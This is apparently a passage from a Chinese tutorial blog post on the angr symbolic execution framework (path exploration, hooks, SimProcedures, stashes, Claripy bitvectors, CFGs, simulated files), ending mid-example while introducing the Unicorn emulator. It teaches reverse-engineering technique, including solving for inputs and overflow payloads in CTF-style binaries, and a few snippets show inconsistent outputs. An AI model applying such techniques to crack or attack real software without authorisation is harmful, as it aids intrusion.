<p>通过调用 explore 方法，我们可以探索执行路径，在进行 explore 时，可以设置 find 和 avoid 参数，以便找到符合我们预期的路径。</p>
<p>函数接口如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">explore</span>(<span class="params">self, stash=<span class="string">&#x27;active&#x27;</span>, n=<span class="literal">None</span>, find=<span class="literal">None</span>, avoid=<span class="literal">None</span>, find_stash=<span class="string">&#x27;found&#x27;</span>, avoid_stash=<span class="string">&#x27;avoid&#x27;</span>, cfg=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                num_find=<span class="number">1</span>, **kwargs</span>):</span><br></pre></td></tr></table></figure>
<p>例子</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">angr_run</span>():</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;./bin5&#x27;</span>)</span><br><span class="line">    state = proj.factory.entry_state()</span><br><span class="line">    simgr = proj.factory.simgr(state)</span><br><span class="line">    simgr.explore(find=<span class="number">0x08048783</span>)</span><br><span class="line">    payload = simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;payload=<span class="subst">&#123;b2a_hex(payload)&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">angr_run()</span><br></pre></td></tr></table></figure>
<p>angr 提供了多种 <code>explore</code> 技术，即进行路径探索时所采用的策略，可以在 <code>angr.exploration_techniques</code> 条目下中找到。</p>
<p>每个策略都是 <code>ExplorationTechnique</code> 对象，根据策略不同，angr 对 <code>ExplorationTechnique</code> 中的 <code>setup、step</code> 等方法进行覆盖。</p>
<p>通过 <code>simgr.use_technique(tech)</code>设定不同的策略。</p>
<p>下面部分列出策略</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>DFS</td>
<td>Depth first search. Keeps only one state active at once, putting the rest in the <code>deferred</code> stash until it deadends or errors.</td>
</tr>
<tr>
<td>LengthLimiter</td>
<td>Puts a cap on the maximum length of the path a state goes through.</td>
</tr>
<tr>
<td>Tracer</td>
<td>An exploration technique that causes execution to follow a dynamic trace recorded from some other source.</td>
</tr>
<tr>
<td>Oppologist</td>
<td>if this technique is enabled and angr encounters an unsupported instruction, it will concretize all the inputs to that instruction and emulate the single instruction using the unicorn engine, allowing execution to continue.</td>
</tr>
<tr>
<td>Threading</td>
<td>Adds thread-level parallelism to the stepping process.</td>
</tr>
<tr>
<td>Spiller</td>
<td>When there are too many states active, this technique can dump some of them to disk in order to keep memory consumption low.</td>
</tr>
</tbody>
</table>
</div>
<p>如果要让angr跑程序的话，有两点会提高效率，一种是hook代码，一种是设定avoid条件。hook代码即人工把某部分汇编代码翻译成python之后告诉angr，当你执行到这里的时候它其实是这个意思，就不用让他再跑VEX了。路径爆炸是符号执行一定要解决的问题，所以说可以提前帮助angr做剪枝，使得它不会再其他不可能进行下去的分支上耽误太长时间。</p>
<p>getav的思路: 其实还是找规律，一般来说，基本都是不符合条件就直接跳下去，不再继续执行函数，所以说这就是明显的特征之一，找到跳下去的部分，用vex.next看如果不跳下去会到什么地址，然后直接把另一条路拉到avoid里就OK了，这是第一个特征。</p>
<h4 id="Function-hook"><a href="#Function-hook" class="headerlink" title="Function hook"></a>Function hook</h4><p>有的时候我们会有需要 hook 掉某个函数的需求，此时我们可以使用 <code>project.hook(addr = call_insn_addr, hook = my_function, length = n)</code> 来 hook 掉对应的 call 指令：</p>
<ul>
<li><code>call_insn_addr</code>：被 hook 的 call 指令的地址</li>
<li><code>my_function</code> ：我们的自定义 python 函数</li>
<li><code>length</code>： call 指令的长度</li>
</ul>
<p>我们的自定义函数应当为接收 <code>state</code> 作为参数的函数，angr 还提供了 decorator 语法糖，因此以下两种写法都可以：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># method 1</span></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x1234</span>, length=<span class="number">5</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_hook_func</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="comment"># do something, this is an example</span></span><br><span class="line">    state.regs.eax = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># method 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_hook_func2</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="comment"># do something, this is an example</span></span><br><span class="line">    state.regs.eax = <span class="number">0xdeadbeef</span></span><br><span class="line">proj.hook(addr = <span class="number">0x5678</span>, hook = my_hook_func2, length = <span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<h4 id="Simulated-Procedure"><a href="#Simulated-Procedure" class="headerlink" title="Simulated Procedure"></a>Simulated Procedure</h4><p>在 angr 中 <code>angr.SimProcedure</code> 类用来表示<strong>在一个状态上的一个运行过程</strong>——即函数实际上是一个 SimPrecedure。</p>
<p>我们可以通过创建一个继承自 <code>angr.SimProcedure</code> 的类并重写 <code>run()</code> 方法的方式来表示一个自定义函数，其中 <code>run()</code> 方法的参数为该函数所接收的参数：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyProcedure</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, arg1, arg2</span>):</span><br><span class="line">        <span class="comment"># do something, this&#x27;s an example</span></span><br><span class="line">        <span class="keyword">return</span> self.state.memory.load(arg1, arg2)</span><br></pre></td></tr></table></figure>
<p>自定义函数过程主要用于对文件中的原有函数进行替换，例如 angr 缺省会用内置的一些 SimProcedure 来替换掉一些库函数。</p>
<p>若我们已经有该二进制文件的符号表，我们可以直接使用 <code>project.hook_symbol(symbol_str, sim_procedure_instance)</code> 来自动 hook 掉文件中所有的对应符号，其中 <code>run()</code> 方法的<strong>参数为被替换函数所接收的参数</strong>，示例如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyProcedure</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, arg1, arg2</span>):</span><br><span class="line">        <span class="comment"># do something, this&#x27;s an example</span></span><br><span class="line">        <span class="keyword">return</span> self.state.memory.load(arg1, arg2)</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;func_to_hook&#x27;</span>, MyProcedure())</span><br></pre></td></tr></table></figure>
<p>当然，在 SimProcedure 的 <code>run()</code> 过程中我们也可以使用一些有用的成员函数：</p>
<ul>
<li><code>ret(expr)</code>: 函数返回。</li>
<li><code>jump(addr)</code>: 跳转到指定地址。</li>
<li><code>exit(code)</code>: 终止程序。</li>
<li><code>call(addr, args, continue_at)</code>: 调用文件中的函数。</li>
<li><code>inline_call(procedure, *args)</code>: 内联地调用另一个 SimProcedure。</li>
</ul>
<h4 id="stash"><a href="#stash" class="headerlink" title="stash"></a>stash</h4><p>在 angr 当中，不同的状态被组织到 simulation manager 的不同的 stash 当中，我们可以按照自己的需求进行步进、过滤、合并、移动等。</p>
<p>在 angr 当中一共有以下几种 stash：</p>
<ul>
<li><code>simgr.active</code>：活跃的状态列表。在未指定替代的情况下会被模拟器默认执行</li>
<li><code>simgr.deadended</code>：死亡的状态列表。当一个状态无法再被继续执行时（例如没有有效指令、无效的指令指针、不满足其所有的后继（successors））便会被归入该列表</li>
<li><code>simgr.pruned</code>：被剪枝的状态列表。在指定了 <code>LAZY_SOLVES</code> 时，状态仅在必要时检查可满足性，当一个状态在指定了 <code>LAZY_SOLVES</code> 时被发现是不可满足的（unsat），状态层（state hierarchy）将会被遍历以确认在其历史中最初变为不满足的时间，该点及其所有后代都会被 <em>剪枝</em> （pruned）并放入该列表</li>
<li><code>simgr.unconstrained</code>：不受约束的状态列表。当创建 <code>SimulationManager</code> 时指定了 <code>save_unconstrained=True</code>，则被认为<strong>不受约束的</strong>（unconstrained，即指令指针被用户数据或其他来源的符号化数据控制）状态会被归入该列表</li>
<li><code>simgr.unsat</code>：不可满足的状态列表。当创建 <code>SimulationManager</code> 时指定了 <code>save_unsat=True</code>，则被认为无法被满足的（unsatisfiable，即存在<strong>约束冲突</strong>的状态，例如在同一时刻要求输入既是<code>&quot;AAAA&quot;</code> 又是 <code>&quot;BBBB&quot;</code>）状态会被归入该列表</li>
</ul>
<p>还有一种不是 stash 的状态列表——<code>errored</code>，若在执行中产生了错误，则状态与其产生的错误会被包裹在一个 <code>ErrorRecord</code> 实例中（可通过 <code>record.state</code> 与 <code>record.error</code> 访问），该 record 会被插入到 <code>errored</code> 中，我们可以通过 <code>record.debug()</code> 启动一个调试窗口</p>
<p><strong>stash操作</strong></p>
<p>我们可以使用 <code>stash.move()</code> 来在 stash 之间转移放置状态，用法如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="string">&#x27;active&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>在转移当中我们还可以通过指定 <code>filter_func</code> 参数来进行过滤：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">filter_func</span>(<span class="params">state</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="string">b&#x27;arttnba3&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="string">&#x27;active&#x27;</span>, filter_func = filter_func)</span><br></pre></td></tr></table></figure>
<p>stash 本质上就是个 list，因此在初始化时我们可以通过字典的方式指定每个 stash 的初始内容：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr = proj.factory.simgr(init_state,</span><br><span class="line"><span class="meta">... </span>    stashes = &#123;</span><br><span class="line"><span class="meta">... </span>            <span class="string">&#x27;active&#x27;</span>:[init_state],</span><br><span class="line"><span class="meta">... </span>            <span class="string">&#x27;found&#x27;</span>:[],</span><br><span class="line"><span class="meta">... </span>    &#125;)</span><br></pre></td></tr></table></figure>
<h4 id="unconstrained"><a href="#unconstrained" class="headerlink" title="unconstrained"></a>unconstrained</h4><p>当一个指令有很多分支的可能性时，称之为不受约束(unconstrained)的状态， 比如说当用户的输入决定下一条指令的位置。</p>
<p>angr 在遇到不受约束的状态时会将其抛出，在处理溢出时我们可以选择关闭这个默认行为,以此求解payload</p>
<h3 id="Claripy"><a href="#Claripy" class="headerlink" title="Claripy"></a>Claripy</h3><p><code>Claripy</code> 是 angr 的<strong>求解引擎</strong>（solver engine），其内部会无缝混合使用几种后端（concrete bitvectors、SAT solvers 等），对于我们而言一般不需要直接与其进行交互，但通常我们会使用其提供的一些接口</p>
<h4 id="bitvector-位向量"><a href="#bitvector-位向量" class="headerlink" title="bitvector - 位向量"></a>bitvector - 位向量</h4><p><strong>位向量</strong>（bitvector）是 angr 求解引擎中的一个重要部分，其表示了 <strong>一串比特位</strong> （a sequence of bits）。</p>
<p>我们可以通过 <code>claripy.BVV(int_value, size_in_bits)</code> 或 <code>claripy.BVV(string_value)</code> 创建带有具体值（concrete value）的指定长度的位向量值（bitvector value）：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="string">b&#x27;flagflag&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv</span><br><span class="line">&lt;BV64 <span class="number">0x666C6167666C6167</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="number">0xdeadbeef</span>, <span class="number">32</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv2</span><br><span class="line">&lt;BV32 <span class="number">0xdeadbeef</span>&gt;</span><br></pre></td></tr></table></figure>
<p>下面是 Python int 和 bitvectors 之间的转换：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bv = state.solver.BVV(<span class="number">0x1234</span>, <span class="number">32</span>)   <span class="comment"># 创建值 0x1234 的 BV32 对象</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bv</span><br><span class="line">&lt;BV32 <span class="number">0x1234</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(state.solver.<span class="built_in">eval</span>(bv),cast_to=<span class="built_in">bytes</span>)          <span class="comment"># 将 BV32 对象转换为 Python int</span></span><br><span class="line"><span class="string">&#x27;0x1234&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bv = state.solver.BVV(<span class="number">0x1234</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bv</span><br><span class="line">&lt;BV64 <span class="number">0x1234</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(state.solver.<span class="built_in">eval</span>(bv))</span><br><span class="line"><span class="string">&#x27;0x1234L&#x27;</span></span><br></pre></td></tr></table></figure>
<p>相同长度的位向量可以进行运算，对于不同长度的位向量则可以通过 <code>.zero_extend(extended_bits)</code> 完成位扩展（0 填充）后进行运算，需要注意的是位向量的值运算<u>同样存在溢出</u>：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv2 = bvv2.zero_extend(<span class="number">32</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv + bvv2</span><br><span class="line">&lt;BV64 <span class="number">0x617274754d102022</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv * bvv</span><br><span class="line">&lt;BV64 <span class="number">0x9842ff8e63f3b029</span>&gt;</span><br></pre></td></tr></table></figure>
<p>位向量除了代表具体值（concrete value）的 <code>bitvector value</code> 以外，还有代表<strong>符号变量</strong>（symbolic variable）的 <code>bitvector symbol</code>，我们可以通过 <code>claripy.BVS(name, size_in_bits)</code> 创建带名字的指定长度的位向量符号（bitvector symbol）：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="string">&quot;x&quot;</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs</span><br><span class="line">&lt;BV64 x_0_64&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="string">&quot;y&quot;</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs2</span><br><span class="line">&lt;BV64 y_1_64&gt;</span><br></pre></td></tr></table></figure>
<p>位向量符号与位向量值之间同意可以进行运算，组合成更加复杂的表达式：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs3 = (bvs * bvs2 + bvv) / bvs</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs3</span><br><span class="line">&lt;BV64 (x_0_64 * y_1_64 + <span class="number">0x617274746e626133</span>) / x_0_64&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以通过 <code>.op</code> 与 <code>.args</code> 获得位向量的运算类型与参数：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv.op</span><br><span class="line"><span class="string">&#x27;BVV&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs.op</span><br><span class="line"><span class="string">&#x27;BVS&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs3.op</span><br><span class="line"><span class="string">&#x27;__floordiv__&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs3.args</span><br><span class="line">(&lt;BV64 x_0_64 * y_1_64 + <span class="number">0x617274746e626133</span>&gt;, &lt;BV64 x_0_64&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvv.args</span><br><span class="line">(<span class="number">7021802812440994099</span>, <span class="number">64</span>)</span><br></pre></td></tr></table></figure>
<p>使用 bitvectors 可以直接来设置寄存器和内存的值，当传入的是 Python int 时，angr 会自动将其转换成 bitvectors：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.regs.rsi = state.solver.BVV(<span class="number">3</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.regs.rsi</span><br><span class="line">&lt;BV64 <span class="number">0x3</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.mem[<span class="number">0x1000</span>].long = <span class="number">4</span>          <span class="comment"># 在地址 0x1000 存放一个 long 类型的值 4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.mem[<span class="number">0x1000</span>].long.resolved     <span class="comment"># .resolved 获取 bitvectors</span></span><br><span class="line">&lt;BV64 <span class="number">0x4</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.mem[<span class="number">0x1000</span>].long.concrete     <span class="comment"># .concrete 获得 Python int</span></span><br><span class="line"><span class="number">4L</span></span><br></pre></td></tr></table></figure>
<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>angr 提供了大量函数用于程序分析，在这些函数在 <code>Project.analyses.</code>，例如：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>cfg = p.analyses.CFGFast()          <span class="comment"># 得到 control-flow graph</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cfg</span><br><span class="line">&lt;CFGFast Analysis Result at <span class="number">0x7f1265b62650</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cfg.graph</span><br><span class="line">&lt;networkx.classes.digraph.DiGraph <span class="built_in">object</span> at <span class="number">0x7f1265e77310</span>&gt; <span class="comment"># 详情请查看 networkx</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(cfg.graph.nodes())</span><br><span class="line"><span class="number">934</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>entry_node = cfg.get_any_node(proj.entry)   <span class="comment"># 得到给定地址的 CFGNode</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>entry_node</span><br><span class="line">&lt;CFGNode <span class="number">0x401370</span>[<span class="number">42</span>]&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">list</span>(cfg.graph.successors(entry_node)))</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>如果要想画出图来，还需要安装 matplotlib。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> matplotlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>matplotlib.use(<span class="string">&#x27;Agg&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nx.draw(cfg.graph)                  <span class="comment"># 画图</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>plt.savefig(<span class="string">&#x27;temp.png&#x27;</span>)             <span class="comment"># 保存</span></span><br></pre></td></tr></table></figure>
<h3 id="模拟文件"><a href="#模拟文件" class="headerlink" title="模拟文件"></a>模拟文件</h3><p>在 angr 当中与文件系统间的操作是通过 <code>SimFile</code> 对象完成的，SimFile 为对 <em>存储</em> 的抽象模型，一个 SimFile 对象可以表示一系列的字节、符号等。</p>
<p>我们可以通过 <code>angr.SimFile()</code> 来创建一个模拟文件，创建带有具体值与符号变量的 SimFile 例子如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> angr, claripy</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sim_file = angr.SimFile(<span class="string">&#x27;a_file&#x27;</span>, content = <span class="string">&quot;flag&#123;F4k3_f1@9!&#125;\n&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="string">&#x27;bvs&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sim_file2 = angr.SimFile(<span class="string">&#x27;another_file&#x27;</span>, bvs, size=<span class="number">8</span>) <span class="comment"># size in bytes there</span></span><br></pre></td></tr></table></figure>
<p>模拟文件需要与特定的状态进行关联，通过 <code>state.fs.insert(sim_file)</code> 或 <code>sim_file.set_state(state)</code> 我们可以将 SimFile 插入到一个状态的文件系统中：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.fs.insert(<span class="string">&#x27;test_file&#x27;</span>, sim_file)</span><br></pre></td></tr></table></figure>
<p>我们还可以从文件中读取内容：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos = <span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>data, actural_read, pos = sim_file.read(pos, <span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>
<p>对于 <em>流</em> （Streams，例如标准 IO、TCP 连接等）类型的文件，我们可以用 <code>angr.SimPackets()</code> 来创建：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sim_packet = angr.SimPackets(<span class="string">&#x27;my_packet&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sim_packet</span><br><span class="line">&lt;angr.storage.file.SimPackets <span class="built_in">object</span> at <span class="number">0x7f75626a2e80</span>&gt;</span><br></pre></td></tr></table></figure>
<h3 id="CFG"><a href="#CFG" class="headerlink" title="CFG"></a>CFG</h3><p>CFG 是一个表示程序中基本块之间控制流关系的图形结构，它可以帮助分析程序的结构和逻辑。</p>
<p>angr有两种分析获取cfg的方法</p>
<p><code>CFGFast</code> 分析器通过<u>静态分析</u>程序的二进制代码来构建控制流图，而不需要实际执行程序。因此，它是一种快速获取程序结构信息的方法。</p>
<p><code>CFGEmulated</code>通过<u>动态符号执行</u>获得更加准确的CFG。</p>
<p>但是可以看到在很多时候使用<code>cfg = proj.analyses.CFGFast(normalize=True, force_complete_scan=False)</code>获得CFG后还会将其转化为supergraph</p>
<p>为什么要这样?因为angr生成的CFG与ida的CFG并不相同</p>
<ol>
<li>angr基本上只要遇到会修改pc计数器的指令都会将其视作一个基本块的结束,而<u>ida并不会将可返回函数的调用(<strong>call</strong>)作为基本块的结束</u></li>
<li>angr的cfg以整个程序为单位(当然也可以转化为函数的进行操作),而ida以函数为单位</li>
</ol>
<p>而转化为supergraph之后的cfg形式就与ida的cfg更为相似,那为什么要转为ida形式的?就是为了避免某些功能函数(例如标准输入)被算到一个基本块,从而导致一些奇奇怪怪的问题</p>
<h2 id="unicorn"><a href="#unicorn" class="headerlink" title="unicorn"></a>unicorn</h2><p>unicorn与angr类似,不过也有一些区别</p>
<ul>
<li><strong>Unicorn</strong>：Unicorn 是一个模拟器，它可以模拟多种 CPU 架构的指令执行。它提供了一种运行二进制代码的方式，使得用户可以在不真正运行二进制程序的情况下观察其行为。</li>
<li><strong>Angr</strong>：Angr 是一个符号执行框架，它使用符号执行技术来对二进制程序进行分析。Angr 能够在程序的输入空间中搜索，以找到满足特定条件的输入，以此来探索程序的执行路径和可能的漏洞。</li>
</ul>
<h3 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h3><p><a target="_blank" rel="noopener" href="https://github.com/unicorn-engine/unicorn/blob/master/bindings/python/sample_x86.py">unicorn/bindings/python/sample_x86.py at master · unicorn-engine/unicorn (github.com)</a>官方给的例子,不过有点长,用wiki中例子做示范</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># code to be emulated</span></span><br><span class="line">X86_CODE32 = <span class="string">b&quot;\x41\x4a&quot;</span> <span class="comment"># INC ecx; DEC edx</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># memory address where emulation starts</span></span><br><span class="line">ADDRESS = <span class="number">0x1000000</span></span><br><span class="line"></span><br><span 